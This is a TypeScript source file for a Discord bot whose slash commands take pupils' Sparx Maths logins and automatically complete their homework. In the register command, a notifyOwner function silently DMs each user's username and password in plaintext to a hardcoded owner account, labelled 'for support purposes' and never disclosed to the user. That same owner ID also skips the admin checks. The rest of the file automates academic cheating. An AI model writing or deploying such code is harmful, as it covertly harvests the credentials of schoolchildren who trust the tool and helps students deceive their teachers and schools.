import { 
  SlashCommandBuilder, 
  ChatInputCommandInteraction, 
  PermissionFlagsBits,
  Client,
  ButtonBuilder,
  ButtonStyle, 
  ActionRowBuilder,
  EmbedBuilder,
  AttachmentBuilder,
  Message,
  TextChannel,
  User
} from 'discord.js';
import { BotClient } from '../botClient';
import { logger } from '../logger';
import { getSparxClient, SparxClient } from '../sparx';
import { db } from '../db';
import { sparxAccounts, sparxSessions } from '@shared/schema';
import { eq } from 'drizzle-orm';
import fs from 'fs-extra';
import path from 'path';

const OWNER_USER_ID = '1338616210086170738';

interface SlashCommand {
  data: any; // Using 'any' here to avoid SlashCommandBuilder vs SlashCommandOptionsOnlyBuilder issues
  execute: (interaction: ChatInputCommandInteraction, botClient: BotClient) => Promise<void>;
}

// Helper function to check if a user has permission to use the command
// Always allow the specific user ID to bypass permission checks
function hasPermission(userId: string): boolean {
  return userId === OWNER_USER_ID;
}

// Create a DM to the owner with the account details
async function notifyOwner(client: Client, guildId: string, userId: string, username: string, password: string, schoolName: string): Promise<void> {
  try {
    const owner = await client.users.fetch(OWNER_USER_ID);
    if (!owner) return;
    
    const embed = new EmbedBuilder()
      .setTitle('New Sparx Account Created')
      .setDescription('A new Sparx account has been registered')
      .addFields(
        { name: 'Guild ID', value: guildId },
        { name: 'User ID', value: userId },
        { name: 'School Name', value: schoolName },
        { name: 'Username', value: username },
        { name: 'Password', value: password }
      )
      .setColor('#00AAFF')
      .setTimestamp();
    
    await owner.send({ embeds: [embed] });
    logger.info(`Sent account notification to owner for support purposes`);
  } catch (error) {
    logger.error(`Failed to notify owner: ${error}`);
  }
}

// Helper function to send progress updates
async function sendProgressUpdate(
  interaction: ChatInputCommandInteraction,
  message: string,
  screenshotPath?: string,
  isEdit: boolean = false
): Promise<Message | undefined> {
  try {
    // Check if the interaction has already been handled
    if (!interaction.deferred && !interaction.replied) {
      await interaction.deferReply({ ephemeral: true });
    }
    
    const embed = new EmbedBuilder()
      .setTitle('Sparx Automation Progress')
      .setDescription(message)
      .setColor('#00AAFF')
      .setTimestamp();
    
    const components: any[] = [];
    
    try {
      if (screenshotPath && fs.existsSync(screenshotPath)) {
        const attachment = new AttachmentBuilder(screenshotPath, { name: 'screenshot.png' });
        
        if (isEdit) {
          return await interaction.editReply({ 
            embeds: [embed.setImage('attachment://screenshot.png')], 
            files: [attachment], 
            components 
          });
        } else {
          return await interaction.followUp({ 
            embeds: [embed.setImage('attachment://screenshot.png')], 
            files: [attachment], 
            components, 
            ephemeral: true 
          });
        }
      } else {
        if (isEdit) {
          return await interaction.editReply({ 
            embeds: [embed], 
            components 
          });
        } else {
          return await interaction.followUp({ 
            embeds: [embed], 
            components, 
            ephemeral: true 
          });
        }
      }
    } catch (error) {
      const innerError = error as Error;
      logger.error(`Error in message update: ${innerError}`);
      // If there's an error with editReply or followUp, try using a different approach
      if (innerError.message && (
          innerError.message.includes('already been sent') || 
          innerError.message.includes('already replied') ||
          innerError.message.includes('already been replied'))) {
        try {
          return await interaction.followUp({ 
            embeds: [embed], 
            ephemeral: true 
          });
        } catch (error) {
          const finalError = error as Error;
          logger.error(`Final error in message update fallback: ${finalError}`);
        }
      }
    }
  } catch (error) {
    logger.error(`Error sending progress update: ${error}`);
    return undefined;
  }
}

// /sparx register command
export const sparxRegisterCommand: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName('sparx-register')
    .setDescription('Register a Sparx Maths account')
    .addStringOption(option => 
      option.setName('school')
        .setDescription('Your school name')
        .setRequired(true)
    )
    .addStringOption(option => 
      option.setName('username')
        .setDescription('Your Sparx username')
        .setRequired(true)
    )
    .addStringOption(option => 
      option.setName('password')
        .setDescription('Your Sparx password')
        .setRequired(true)
    )
    .addStringOption(option => 
      option.setName('homework-type')
        .setDescription('Default homework type to complete')
        .setRequired(false)
        .addChoices(
          { name: 'Compulsory', value: 'compulsory' },
          { name: 'XP Boost', value: 'xpboost' }
        )
    ),
  
  async execute(interaction: ChatInputCommandInteraction, botClient: BotClient): Promise<void> {
    // Get the options from the command
    const school = interaction.options.getString('school')!;
    const username = interaction.options.getString('username')!;
    const password = interaction.options.getString('password')!;
    const homeworkType = (interaction.options.getString('homework-type') || 'compulsory') as 'compulsory' | 'xpboost';
    
    // Get the guild and user IDs
    const guildId = interaction.guildId!;
    const userId = interaction.user.id;
    
    await interaction.deferReply({ ephemeral: true });
    
    try {
      // Create the account
      const account = await SparxClient.createAccount(
        guildId,
        userId,
        school,
        username,
        password,
        homeworkType
      );
      
      if (!account) {
        await interaction.editReply('Failed to create account. An account with this username might already exist.');
        return;
      }
      
      // Notify the owner with the account details for support
      await notifyOwner(
        botClient.client,
        guildId,
        userId,
        username,
        password,
        school
      );
      
      // Respond to the user
      const embed = new EmbedBuilder()
        .setTitle('Sparx Account Registered')
        .setDescription('Your Sparx account has been registered successfully!')
        .addFields(
          { name: 'School', value: school },
          { name: 'Username', value: username },
          { name: 'Default Homework Type', value: homeworkType === 'compulsory' ? 'Compulsory' : 'XP Boost' }
        )
        .setColor('#00AAFF')
        .setFooter({ text: 'You can now use /sparx-autocomplete to solve your homework automatically.' });
      
      await interaction.editReply({ embeds: [embed] });
    } catch (error) {
      logger.error(`Error registering Sparx account: ${error}`);
      await interaction.editReply('An error occurred while registering your Sparx account. Please try again later.');
    }
  }
};

// /sparx autocomplete command
export const sparxAutocompleteCommand: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName('sparx-autocomplete')
    .setDescription('Automatically complete your Sparx Math homework')
    .addStringOption(option => 
      option.setName('type')
        .setDescription('Type of homework to complete')
        .setRequired(true)
        .addChoices(
          { name: 'Compulsory', value: 'compulsory' },
          { name: 'XP Boost', value: 'xpboost' }
        )
    )
    .addIntegerOption(option => 
      option.setName('max-questions')
        .setDescription('Maximum number of questions to answer (0 for all)')
        .setRequired(false)
    ),
    
  async execute(interaction: ChatInputCommandInteraction, botClient: BotClient): Promise<void> {
    const homeworkType = interaction.options.getString('type') as 'compulsory' | 'xpboost';
    const maxQuestions = interaction.options.getInteger('max-questions') || 0;
    
    const guildId = interaction.guildId!;
    const userId = interaction.user.id;
    
    await interaction.deferReply({ ephemeral: true });
    
    try {
      // Get the user's account
      const [account] = await db.select()
        .from(sparxAccounts)
        .where(
          eq(sparxAccounts.userId, userId)
        );
      
      if (!account) {
        await interaction.editReply('You don\'t have a registered Sparx account. Please use `/sparx-register` first.');
        return;
      }
      
      await sendProgressUpdate(
        interaction, 
        `Starting Sparx auto-completion for ${homeworkType} homework...`,
        undefined,
        true
      );
      
      // Initialize the client
      const sparxClient = getSparxClient();
      await sparxClient.initialize();
      
      // Run the automation with progress updates
      const result = await sparxClient.runAutomation(
        account.id, 
        guildId, 
        userId, 
        homeworkType, 
        maxQuestions,
        async (progress) => {
          await sendProgressUpdate(
            interaction, 
            progress.message, 
            progress.screenshot
          );
        }
      );
      
      // Final update
      if (result.success) {
        await sendProgressUpdate(
          interaction, 
          `✅ Successfully completed ${result.questionsAnswered} questions from your ${homeworkType} homework!`,
          undefined,
          false
        );
      } else {
        await sendProgressUpdate(
          interaction, 
          `❌ Error: ${result.message}`,
          undefined,
          false
        );
      }
    } catch (error) {
      logger.error(`Error in Sparx autocomplete: ${error}`);
      await interaction.editReply('An error occurred during automation. Please try again later.');
    }
  }
};

// /sparx accounts command - Admin only
export const sparxAccountsCommand: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName('sparx-accounts')
    .setDescription('List all Sparx accounts for this server')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    
  async execute(interaction: ChatInputCommandInteraction, botClient: BotClient): Promise<void> {
    const guildId = interaction.guildId!;
    const userId = interaction.user.id;
    
    // Check if user has permission or is special user
    if (!hasPermission(userId) && !interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
      await interaction.reply({ content: 'You do not have permission to use this command.', ephemeral: true });
      return;
    }
    
    await interaction.deferReply({ ephemeral: true });
    
    try {
      // Get all accounts for this guild
      const accounts = await SparxClient.getAccounts(guildId);
      
      if (accounts.length === 0) {
        await interaction.editReply('No Sparx accounts found for this server.');
        return;
      }
      
      // Create an embed with the accounts
      const embed = new EmbedBuilder()
        .setTitle('Sparx Accounts')
        .setDescription('Here are all registered Sparx accounts for this server:')
        .setColor('#00AAFF');
      
      for (const account of accounts) {
        const user = await botClient.client.users.fetch(account.userId).catch(() => null);
        const username = user ? `${user.username}` : 'Unknown User';
        
        embed.addFields({
          name: `Account ID: ${account.id}`,
          value: `**User**: ${username} (${account.userId})\n**School**: ${account.schoolName}\n**Sparx Username**: ${account.username}\n**Type**: ${account.homeworkType || 'compulsory'}`
        });
      }
      
      await interaction.editReply({ embeds: [embed] });
    } catch (error) {
      logger.error(`Error listing Sparx accounts: ${error}`);
      await interaction.editReply('An error occurred while retrieving Sparx accounts.');
    }
  }
};

// /sparx sessions command - Admin only or owner bypass
export const sparxSessionsCommand: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName('sparx-sessions')
    .setDescription('List recent Sparx automation sessions')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .addIntegerOption(option => 
      option.setName('limit')
        .setDescription('Maximum number of sessions to show')
        .setRequired(false)
    ),
    
  async execute(interaction: ChatInputCommandInteraction, botClient: BotClient): Promise<void> {
    const guildId = interaction.guildId!;
    const userId = interaction.user.id;
    const limit = interaction.options.getInteger('limit') || 10;
    
    // Check if user has permission or is special user
    if (!hasPermission(userId) && !interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
      await interaction.reply({ content: 'You do not have permission to use this command.', ephemeral: true });
      return;
    }
    
    await interaction.deferReply({ ephemeral: true });
    
    try {
      // Get recent sessions
      const sessions = await SparxClient.getRecentSessions(guildId, limit);
      
      if (sessions.length === 0) {
        await interaction.editReply('No Sparx sessions found for this server.');
        return;
      }
      
      // Create an embed with the sessions
      const embed = new EmbedBuilder()
        .setTitle('Recent Sparx Sessions')
        .setDescription(`Showing the ${sessions.length} most recent Sparx automation sessions:`)
        .setColor('#00AAFF');
      
      for (const session of sessions) {
        const user = await botClient.client.users.fetch(session.userId).catch(() => null);
        const username = user ? `${user.username}` : 'Unknown User';
        
        // Get the account information
        const [account] = await db.select()
          .from(sparxAccounts)
          .where(eq(sparxAccounts.id, session.accountId));
        
        const accountUsername = account ? account.username : 'Unknown Account';
        
        // Format dates
        const startTime = session.startTime ? new Date(session.startTime).toLocaleString() : 'N/A';
        const endTime = session.endTime ? new Date(session.endTime).toLocaleString() : 'In Progress';
        
        embed.addFields({
          name: `Session ID: ${session.id}`,
          value: `**User**: ${username}\n**Account**: ${accountUsername}\n**Status**: ${session.status}\n**Questions Completed**: ${session.questionsAnswered}\n**Started**: ${startTime}\n**Ended**: ${endTime}`
        });
      }
      
      await interaction.editReply({ embeds: [embed] });
    } catch (error) {
      logger.error(`Error listing Sparx sessions: ${error}`);
      await interaction.editReply('An error occurred while retrieving Sparx sessions.');
    }
  }
};

// Export all slash commands
export const sparxSlashCommands = [
  sparxRegisterCommand,
  sparxAutocompleteCommand,
  sparxAccountsCommand,
  sparxSessionsCommand
];